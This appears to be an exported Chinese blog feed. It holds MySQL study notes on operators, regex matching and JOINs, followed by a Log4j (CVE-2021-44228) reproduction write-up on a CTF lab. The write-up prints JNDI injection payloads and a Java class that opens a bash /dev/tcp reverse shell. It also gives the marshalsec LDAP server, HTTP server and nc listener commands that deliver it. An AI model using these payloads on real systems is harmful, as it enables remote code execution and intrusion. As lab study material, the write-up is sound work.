align="left">取反</td></tr><tr><td align="left">&lt;&lt;</td><td align="left">左移</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">右移</td></tr></tbody></table><p>1、按位与</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 3&amp;5;</span><br><span class="line">+-----+</span><br><span class="line">| 3&amp;5 |</span><br><span class="line">+-----+</span><br><span class="line">|   1 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>2、按位或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 3|5;</span><br><span class="line">+-----+</span><br><span class="line">| 3|5 |</span><br><span class="line">+-----+</span><br><span class="line">|   7 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>3、按位异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 3^5;</span><br><span class="line">+-----+</span><br><span class="line">| 3^5 |</span><br><span class="line">+-----+</span><br><span class="line">|   6 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>4、按位取反</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~18446744073709551612;</span><br><span class="line">+-----------------------+</span><br><span class="line">| ~18446744073709551612 |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     3 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p>5、按位右移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 3&gt;&gt;1;</span><br><span class="line">+------+</span><br><span class="line">| 3&gt;&gt;1 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p>6、按位左移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 3&lt;&lt;1;</span><br><span class="line">+------+</span><br><span class="line">| 3&lt;&lt;1 |</span><br><span class="line">+------+</span><br><span class="line">|    6 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><hr><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p>最低优先级为： **:=**。</p><p><img src="%7Bfilename%7D/1011652-20170416163043227-1936139924.png" alt="img"></p><p>最高优先级为： <strong>!<strong>、</strong>BINARY</strong>、 <strong>COLLATE</strong>。</p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h1 id="MySQL-正则表达式"><a href="#MySQL-正则表达式" class="headerlink" title="MySQL 正则表达式"></a>MySQL 正则表达式</h1><p>在前面的章节我们已经了解到MySQL可以通过 <strong>LIKE …%</strong> 来进行模糊匹配。</p><p>MySQL 同样也支持其他正则表达式的匹配， MySQL中使用 REGEXP 操作符来进行正则表达式匹配。</p><p>如果您了解PHP或Perl，那么操作起来就非常简单，因为MySQL的正则表达式匹配与这些脚本的类似。</p><p>下表中的正则模式可应用于 REGEXP 操作符中。</p><table><thead><tr><th align="left">模式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td></tr><tr><td align="left">$</td><td align="left">匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td></tr><tr><td align="left">.</td><td align="left">匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用像 ‘[.\n]’ 的模式。</td></tr><tr><td align="left">[…]</td><td align="left">字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。</td></tr><tr><td align="left">[^…]</td><td align="left">负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’。</td></tr><tr><td align="left">p1|p2|p3</td><td align="left">匹配 p1 或 p2 或 p3。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。</td></tr><tr><td align="left">*</td><td align="left">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td></tr><tr><td align="left">+</td><td align="left">匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td></tr><tr><td align="left">{n}</td><td align="left">n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td></tr><tr><td align="left">{n,m}</td><td align="left">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。</td></tr></tbody></table><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>了解以上的正则需求后，我们就可以根据自己的需求来编写带有正则表达式的SQL语句。以下我们将列出几个小实例(表名：person_tbl )来加深我们的理解：</p><p>查找name字段中以’st’为开头的所有数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#x27;^st&#x27;;</span><br></pre></td></tr></table></figure><p>查找name字段中以’ok’为结尾的所有数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#x27;ok$&#x27;;</span><br></pre></td></tr></table></figure><p>查找name字段中包含’mar’字符串的所有数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#x27;mar&#x27;;</span><br></pre></td></tr></table></figure><p>查找name字段中以元音字符开头或以’ok’字符串结尾的所有数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#x27;^[aeiou]|ok$&#x27;;</span><br></pre></td></tr></table></figure><h3 id="连接-1"><a href="#连接-1" class="headerlink" title="连接"></a>连接</h3><p>MySQL 连接的使用</p><p>使用 MySQL 的 JOIN 在两个或多个表中查询数据。</p><p>你可以在 SELECT, UPDATE 和 DELETE 语句中使用 Mysql 的 JOIN 来联合多表查询。</p><p>JOIN 按照功能大致分为如下三类：</p><ul><li><strong>INNER JOIN（内连接,或等值连接）</strong>：获取两个表中字段匹配关系的记录。</li><li><strong>LEFT JOIN（左连接）：</strong>获取左表所有记录，即使右表没有对应匹配的记录。</li><li><strong>RIGHT JOIN（右连接）：</strong> 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。</li></ul><p>本章节使用的数据库结构及数据下载：<a href="https://static.runoob.com/download/runoob-mysql-join-test.sql">runoob-mysql-join-test.sql</a>。</p><p>在命令提示符中使用 INNER JOIN</p><p>我们在RUNOOB数据库中有两张表 tcount_tbl 和 runoob_tbl。两张数据表数据如下：</p><p>实例</p><p>尝试以下实例：</p><p>测试实例数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB; Database changed mysql&gt; SELECT * FROM tcount_tbl; +---------------+--------------+ | runoob_author | runoob_count | +---------------+--------------+ | 菜鸟教程  | 10           | | RUNOOB.COM    | 20           | | Google        | 22           | +---------------+--------------+ 3 rows in set (0.01 sec)  mysql&gt; SELECT * from runoob_tbl; +-----------+---------------+---------------+-----------------+ | runoob_id | runoob_title  | runoob_author | submission_date | +-----------+---------------+---------------+-----------------+ | 1         | 学习 PHP    | 菜鸟教程  | 2017-04-12      | | 2         | 学习 MySQL  | 菜鸟教程  | 2017-04-12      | | 3         | 学习 Java   | RUNOOB.COM    | 2015-05-01      | | 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      | | 5         | 学习 C      | FK            | 2017-04-05      | +-----------+---------------+---------------+-----------------+ 5 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>接下来我们就使用MySQL的**INNER JOIN(也可以省略 INNER 使用 JOIN，效果一样)**来连接以上两张表来读取runoob_tbl表中所有runoob_author字段在tcount_tbl表对应的runoob_count字段值：</p><h2 id="INNER-JOIN"><a href="#INNER-JOIN" class="headerlink" title="INNER JOIN"></a>INNER JOIN</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author; +-------------+-----------------+----------------+ | a.runoob_id | a.runoob_author | b.runoob_count | +-------------+-----------------+----------------+ | 1           | 菜鸟教程    | 10             | | 2           | 菜鸟教程    | 10             | | 3           | RUNOOB.COM      | 20             | | 4           | RUNOOB.COM      | 20             | +-------------+-----------------+----------------+ 4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>以上 SQL 语句等价于：</p><p>WHERE 子句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a, tcount_tbl b WHERE a.runoob_author = b.runoob_author; +-------------+-----------------+----------------+ | a.runoob_id | a.runoob_author | b.runoob_count | +-------------+-----------------+----------------+ | 1           | 菜鸟教程    | 10             | | 2           | 菜鸟教程    | 10             | | 3           | RUNOOB.COM      | 20             | | 4           | RUNOOB.COM      | 20             | +-------------+-----------------+----------------+ 4 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p><img src="img_innerjoin.gif" alt="img"></p><p>MySQL LEFT JOIN</p><p>MySQL left join 与 join 有所不同。 MySQL LEFT JOIN 会读取左边数据表的全部数据，即便右边表无对应数据。</p><p>实例</p><p>尝试以下实例，以 <strong>runoob_tbl</strong> 为左表，<strong>tcount_tbl</strong> 为右表，理解 MySQL LEFT JOIN 的应用：</p><p>LEFT JOIN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a LEFT JOIN tcount_tbl b ON a.runoob_author = b.runoob_author; +-------------+-----------------+----------------+ | a.runoob_id | a.runoob_author | b.runoob_count | +-------------+-----------------+----------------+ | 1           | 菜鸟教程    | 10             | | 2           | 菜鸟教程    | 10             | | 3           | RUNOOB.COM      | 20             | | 4           | RUNOOB.COM      | 20             | | 5           | FK              | NULL           | +-------------+-----------------+----------------+ 5 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">以上实例中使用了 LEFT JOIN，该语句会读取左边的数据表 runoob_tbl 的所有选取的字段数据，即便在右侧表 tcount_tbl中 没有对应的 runoob_author 字段值。</span><br></pre></td></tr></table></figure><p><img src="img_leftjoin.gif" alt="img"></p><p>MySQL RIGHT JOIN</p><p>MySQL RIGHT JOIN 会读取右边数据表的全部数据，即便左边边表无对应数据。</p><p>实例</p><p>尝试以下实例，以 <strong>runoob_tbl</strong> 为左表，<strong>tcount_tbl</strong> 为右表，理解MySQL RIGHT JOIN的应用：</p><p>RIGHT JOIN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a RIGHT JOIN tcount_tbl b ON a.runoob_author = b.runoob_author; +-------------+-----------------+----------------+ | a.runoob_id | a.runoob_author | b.runoob_count | +-------------+-----------------+----------------+ | 1           | 菜鸟教程    | 10             | | 2           | 菜鸟教程    | 10             | | 3           | RUNOOB.COM      | 20             | | 4           | RUNOOB.COM      | 20             | | NULL        | NULL            | 22             | +-------------+-----------------+----------------+ 5 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>以上实例中使用了 RIGHT JOIN，该语句会读取右边的数据表 tcount_tbl 的所有选取的字段数据，即便在左侧表 runoob_tbl 中没有对应的runoob_author 字段值。</p><p><img src="img_rightjoin.gif" alt="img"></p><p>在 PHP 脚本中使用 JOIN</p><p>PHP 中使用 mysqli_query() 函数来执行 SQL 语句，你可以使用以上的相同的 SQL 语句作为 mysqli_query() 函数的参数。</p><p>尝试如下实例:</p><p>MySQL ORDER BY 测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址 $dbuser = &#x27;root&#x27;;            // mysql用户名 $dbpass = &#x27;123456&#x27;;          // mysql用户名密码 $conn = mysqli_connect($dbhost, $dbuser, $dbpass); if(! $conn ) &#123;     die(&#x27;连接失败: &#x27; . mysqli_error($conn)); &#125; // 设置编码，防止中文乱码 mysqli_query($conn , &quot;set names utf8&quot;);   $sql = &#x27;SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author&#x27;;   mysqli_select_db( $conn, &#x27;RUNOOB&#x27; ); $retval = mysqli_query( $conn, $sql ); if(! $retval ) &#123;     die(&#x27;无法读取数据: &#x27; . mysqli_error($conn)); &#125; echo &#x27;&lt;h2&gt;菜鸟教程 MySQL JOIN 测试&lt;h2&gt;&#x27;; echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;登陆次数&lt;/td&gt;&lt;/tr&gt;&#x27;; while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) &#123;     echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.          &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.          &quot;&lt;td&gt;&#123;$row[&#x27;runoob_count&#x27;]&#125; &lt;/td&gt; &quot;.          &quot;&lt;/tr&gt;&quot;; &#125; echo &#x27;&lt;/table&gt;&#x27;; mysqli_close($conn); ?&gt;</span><br></pre></td></tr></table></figure><p>输出结果如下图所示：</p><p><img src="75178A78-101C-44E3-B5B5-F20B3E7445CB.jpg" alt="img"></p><h2 id="SQL-JOIN-中-on-与-where-的区别"><a href="#SQL-JOIN-中-on-与-where-的区别" class="headerlink" title="SQL JOIN 中 on 与 where 的区别"></a>SQL JOIN 中 on 与 where 的区别</h2><p><img src="1528881587-3295-201505.png" alt="img"></p><ul><li><strong>left join</strong> : 左连接，返回左表中所有的记录以及右表中连接字段相等的记录。</li><li><strong>right join</strong> : 右连接，返回右表中所有的记录以及左表中连接字段相等的记录。</li><li><strong>inner join</strong> : 内连接，又叫等值连接，只返回两个表中连接字段相等的行。</li><li><strong>full join</strong> : 外连接，返回两个表中的行：left join + right join。</li><li><strong>cross join</strong> : 结果是笛卡尔积，就是第一个表的行数乘以第二个表的行数。</li></ul><h3 id="关键字-on"><a href="#关键字-on" class="headerlink" title="关键字 on"></a>关键字 on</h3><p>数据库在通过连接两张或多张表来返回记录时，都会生成一张中间的临时表，然后再将这张临时表返回给用户。</p><p>在使用 <strong>left jion</strong> 时，<strong>on</strong> 和 <strong>where</strong> 条件的区别如下：</p><ul><li>1、 <strong>on</strong> 条件是在生成临时表时使用的条件，它不管 <strong>on</strong> 中的条件是否为真，都会返回左边表中的记录。</li><li>2、<strong>where</strong> 条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有 <strong>left join</strong> 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。</li></ul><p>假设有两张表：</p><p><strong>表1：tab1</strong></p><table><thead><tr><th>id</th><th>size</th></tr></thead><tbody><tr><td>1</td><td>10</td></tr><tr><td>2</td><td>20</td></tr><tr><td>3</td><td>30</td></tr></tbody></table><p><strong>表2：tab2</strong></p><table><thead><tr><th>size</th><th>name</th></tr></thead><tbody><tr><td>10</td><td>AAA</td></tr><tr><td>20</td><td>BBB</td></tr><tr><td>20</td><td>CCC</td></tr></tbody></table><p>两条 SQL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from tab1 left join tab2 on (tab1.size = tab2.size) where tab2.name=&#x27;AAA&#x27;</span><br><span class="line"></span><br><span class="line">select * from tab1 left join tab2 on (tab1.size = tab2.size and tab2.name=&#x27;AAA&#x27;)</span><br></pre></td></tr></table></figure><p>第一条SQL的过程： 1、中间表 on条件: tab1.size = tab2.sizetab1.idtab1.sizetab2.sizetab2.name11010AAA22020BBB22020CCC330(null)(null)  2、再对中间表过滤 where 条件： tab2.name=’AAA’tab1.idtab1.sizetab2.sizetab2.name11010AAA  </p><p>第二条SQL的过程： 1、中间表 on条件: tab1.size = tab2.size and tab2.name=’AAA’ (条件不为真也会返回左表中的记录)tab1.idtab1.sizetab2.sizetab2.name11010AAA220(null)(null)330(null)(null) </p><p>其实以上结果的关键原因就是 <strong>left join、right join、full join</strong> 的特殊性，不管 <strong>on</strong> 上的条件是否为真都会返回 <strong>left</strong> 或 <strong>right</strong> 表中的记录，<strong>full</strong> 则具有 <strong>left</strong> 和 <strong>right</strong> 的特性的并集。 而 <strong>inner jion</strong> 没这个特殊性，则条件放在 <strong>on</strong> 中和 <strong>where</strong> 中，返回的结果集是相同的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apachelog4j漏洞复现</title>
      <link href="/2021/12/18/apachelog4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/12/18/apachelog4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Log4j-漏洞（JNDI注入-CVE-2021-44228）"><a href="#Apache-Log4j-漏洞（JNDI注入-CVE-2021-44228）" class="headerlink" title="Apache Log4j 漏洞（JNDI注入 CVE-2021-44228）"></a>Apache Log4j 漏洞（JNDI注入 CVE-2021-44228）</h1><p>原理：<a href="https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg">https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg</a></p><p>总结一下就是，日志中${}中的部分会被当作lookup函数的参数。</p><p>apacjhe log4j中的lookup作用是方便系统将特殊的值添加到日志之中，例如${hostname}就是主机名</p><p>只能说期末复习杀我   </p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6b6Z5Zyo5bGx5Lic,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p><p>漏洞影响范围</p><blockquote><p>2.0 &lt;= Apache log4j &lt;= 2.14.1</p></blockquote><pre><code>import org.apache.log4j.Logger;import java.io.*;import java.sql.SQLException;import java.util.*;public class VulnerableLog4jExampleHandler implements HttpHandler &#123;  static Logger log = Logger.getLogger(log4jExample.class.getName());  /**   * A simple HTTP endpoint that reads the request&#39;s User Agent and logs it back.   * This is basically pseudo-code to explain the vulnerability, and not a full example.   * @param he HTTP Request Object     */       public void handle(HttpExchange he) throws IOException &#123;       string userAgent = he.getRequestHeader(&quot;user-agent&quot;);// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.// The attacker can set their User-Agent header to: $&#123;jndi:ldap://attacker.com/a&#125;log.info(&quot;Request User Agent:&quot; + userAgent);String response = &quot;&lt;h1&gt;Hello There, &quot; + userAgent + &quot;!&lt;/h1&gt;&quot;;he.sendResponseHeaders(200, response.length());OutputStream os = he.getResponseBody();os.write(response.getBytes());os.close();  &#125;&#125;</code></pre><blockquote><p>Data from the User gets sent to the server (via any protocol),<br>The server logs the data in the request, containing the malicious payload: ${jndi:ldap://attacker.com/a} (where attacker.com is an attacker controlled server),<br>The log4j vulnerability is triggered by this payload and the server makes a request to attacker.com via “Java Naming and Directory Interface” (JNDI),<br>This response contains a path to a remote Java class file (ex. <a href="http://second-stage.attacker.com/Exploit.class">http://second-stage.attacker.com/Exploit.class</a>) which is injected into the server process,<br>This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.</p></blockquote><p>另一种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">public class Poc &#123;</span><br><span class="line">    private static final Logger log = LogManager.getLogger();</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        log.error(&quot;$&#123;jndi:rmi://127.0.0.1:1099/xxxx&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6b6Z5Zyo5bGx5Lic,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764251.png" alt="1"></p><h1 id="ctfshow复现"><a href="#ctfshow复现" class="headerlink" title="ctfshow复现"></a>ctfshow复现</h1><p>我们通过JNDI注入请求DNSLOG的恶意语句，如果在DNSLOG端能查看到访问记录，则证明远程代码执行漏洞存在</p><p>我们CTFshow的靶场来做后续验证</p><p>我们直接在登录框输入恶意代码：</p><blockquote><p>${jndi:ldap://hackerj.5ymw72.dnslog.cn/exp}</p></blockquote><p>然后我们成功在DNSLOG端查看到访问记录，证实这里漏洞存在</p><p><img src="image-20211217195542264.png" alt="image-20211217195542264"></p><p>在vps</p><p>启一个python服务启一个java服务 监听反弹的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这个东西需要在vps上编译 妈的因为这个编译问题只能执行弹不了shell卡了好久</span><br><span class="line">public class Test &#123;</span><br><span class="line">        static&#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Runtime r = Runtime.getRuntime();</span><br><span class="line">                String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xxx/50025;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">                Process p = r.exec(cmd);</span><br><span class="line">                p.waitFor();</span><br><span class="line">            &#125;catch (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE20211220145859.png" alt="QQ浏览器截图20211220145859"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 50026</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://xxx:50026/#Test&quot;</span><br><span class="line"></span><br><span class="line">nc -lvnp 50025</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE20211220145851.png" alt="QQ浏览器截图20211220145851"></p><p><img src="QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE20211220145856.png" alt="QQ浏览器截图20211220145856"></p><p>payload：${jndi:ldap://101.35.158.27:1389/Test}</p><p><img src="2.png" alt="image-20211220162619219"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞代码在log4j-core与log4j-api这两个jar包中。</span><br></pre></td></tr></table></figure><p>环境：<a href="https://github.com/shanfenglan/apache_log4j_poc">https://github.com/shanfenglan/apache_log4j_poc</a></p><p>利用条件<br>2.0 &lt;= Log4j -2 &lt;= 2.14.1</p><p>环境搭建<br>依赖的xml配置在这里查找：<a href="https://mvnrepository.com/artifact/org.slf4j/slf4j-api/1.7.25">https://mvnrepository.com/artifact/org.slf4j/slf4j-api/1.7.25</a></p><p>使用idea创建一个Maven项目，并在pom.xml中添加漏洞版本Apache log4j的相关依赖，分别为log4j-core与log4j-api，最终完整的含具体pom.xml文件如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;org.example&lt;/groupId&gt;    &lt;artifactId&gt;log4j-rce&lt;/artifactId&gt;    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    &lt;dependencies&gt;        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;            &lt;version&gt;2.14.1&lt;/version&gt;        &lt;/dependency&gt;        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;            &lt;version&gt;2.14.1&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;&lt;/project&gt;</code></pre><p>然后创建一个java文件内容如下：</p><pre><code>import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;</code></pre><p>​    </p><pre><code>public class Log4j &#123;    private static final Logger logger = LogManager.getLogger(Log4j.class);    public static void main(String[] args) &#123;        logger.error(&quot;$&#123;jndi:ldap://192.168.171.1:12344/a&#125;&quot;);    &#125;&#125;</code></pre><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"></p><p>执行这个java文件即可利用漏洞。</p><p><a href="https://github.com/tangxiaofeng7/apache-log4j-poc">https://github.com/tangxiaofeng7/apache-log4j-poc</a></p><p>利用<br>poc：</p><blockquote><p>${jndi:ldap://192.168.171;1:12344/Basic/Command/whoami}</p></blockquote><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764262.png" alt="在这里插入图片描述"></p><p>补充：命令执行部分<br>这个命令执行是本地的命令执行，也就是说恶意的class文件必须得和漏洞利用点所在的文件在同一文件夹或者同一个jar包内，举例如下：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764263.png" alt="在这里插入图片描述"></p><p>log4j这个class是漏洞文件，执行后可以利用漏洞。<br>Log4jRCE是恶意的class文件，作用是在tmp下创建一个文件，名为123。<br>Tttouch是恶意的class文件，作用是在tmp下创建一个文件，名为1.txt。</p><p>我们先看看log4j.java的内容：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764264.png" alt="在这里插入图片描述"></p><p>启动jndi服务端命令：</p><blockquote><p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a href="http://127.0.0.1:8888/#Tttouch&quot;">http://127.0.0.1:8888/#Tttouch&quot;</a></p></blockquote><p><img 